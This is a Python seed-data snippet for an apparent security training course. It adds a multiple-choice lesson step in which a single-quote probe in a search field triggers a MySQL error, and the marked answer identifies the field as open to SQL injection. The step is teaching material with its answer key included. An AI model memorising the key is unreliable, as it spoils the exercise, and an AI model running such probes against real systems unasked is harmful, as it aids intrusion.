    db.session.add(LessonStep(lesson_id=l3_6.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="You enter a single quote `'` into a search field and get this response:\\n```\\nError: You have an error in your SQL syntax; check the manual\\nthat corresponds to your MySQL server version for the right\\nsyntax to use near ''''' at line 1\\n```\\nWhat does this tell you?", options=_opts(("A", "A) The search is broken and needs fixing"), ("B", "B) The application uses MySQL and the search field is vulnerable to SQL injection"), ("C", "C) The application correctly blocked your injection attempt"), ("D", "D) MySQL is not running")), correct_answer="B) The application uses MySQL and the search field is vulnerable to SQL injection", explanation="The error reveals two things: (1) The app uses MySQL (mentioned in the error), and (2) user input is directly embedded in SQL queries (the quote caused a syntax error instead of being safely handled).", hints=_j([])))
    l3_7 = Lesson(module_id=m3.id, order_index=7, title="Sandbox Challenge", narrative="", code_snippet=None, code_language=None, table_data=None)
    db.session.add(l3_7)
